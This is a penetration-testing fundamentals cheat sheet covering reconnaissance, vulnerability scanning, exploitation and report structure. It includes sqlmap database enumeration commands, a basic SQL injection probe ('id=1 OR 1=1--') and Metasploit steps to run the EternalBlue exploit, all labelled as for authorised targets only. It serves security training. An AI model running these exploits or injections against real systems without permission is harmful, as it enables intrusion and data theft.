# Penetration Testing — Fundamentals

## Phase 1: Reconnaissance

### Passive Reconnaissance (no contact with target)
```bash
# WHOIS lookup
whois target.com

# DNS enumeration
dig target.com A AAAA MX NS TXT
dig @8.8.8.8 target.com
dnsrecon -d target.com -t std

# Subdomain enumeration
# theHarvester -d target.com -b google,bing
# subfinder -d target.com
# amass enum -d target.com

# Find email addresses, documents with metadata
# theHarvester -d target.com -b all
```

### Active Reconnaissance
```bash
# Network discovery
nmap -sn 192.168.1.0/24          # Ping sweep (host discovery)
nmap -sV -sC target.com           # Service/version + default scripts
nmap -p- --min-rate 5000 target.com  # All 65535 ports (fast)
nmap -A target.com                # OS detection + traceroute

# Web server fingerprinting
curl -I https://target.com        # HTTP headers
nikto -h https://target.com       # Web vulnerability scanner
```

## Phase 2: Vulnerability Assessment

```bash
# Check for known CVEs in services found
searchsploit nginx 1.18           # Local exploit database
searchsploit -x path/to/exploit   # Read exploit details

# Web application vulnerabilities
# SQLi test
curl "https://target.com/page?id=1'"  # Single quote test
curl "https://target.com/page?id=1 OR 1=1--"

# Directory enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u https://target.com/FUZZ -w wordlist.txt

# SSL/TLS check
testssl.sh target.com
nmap --script ssl-enum-ciphers -p 443 target.com
```

## Phase 3: Exploitation (Authorized Only)

```bash
# Metasploit basics
msfconsole
search type:exploit name:eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS target-ip
set LHOST your-ip
check          # Test if vulnerable (no exploitation)
run            # ONLY on systems you have permission to test

# SQL Injection with sqlmap (only on authorized targets)
sqlmap -u "http://target.com/page?id=1" --batch --level=1
sqlmap -u "http://target.com/page?id=1" --dbs       # List databases
sqlmap -u "http://target.com/page?id=1" -D mydb --tables
```

## Report Writing

Every pen test ends with a report. Structure:
```
1. Executive Summary    (2 pages, non-technical, business impact)
2. Scope & Methodology  (what was tested, how)
3. Findings
   For each finding:
   - Title: SQL Injection in Login Form
   - Severity: Critical / High / Medium / Low / Informational
   - CVSS Score: 9.8
   - Description: technical explanation
   - Evidence: screenshot, HTTP request/response
   - Impact: what an attacker could do
   - Remediation: exact steps to fix
4. Attack Narrative     (story of how you got in)
5. Appendix             (raw output, tool versions)
```
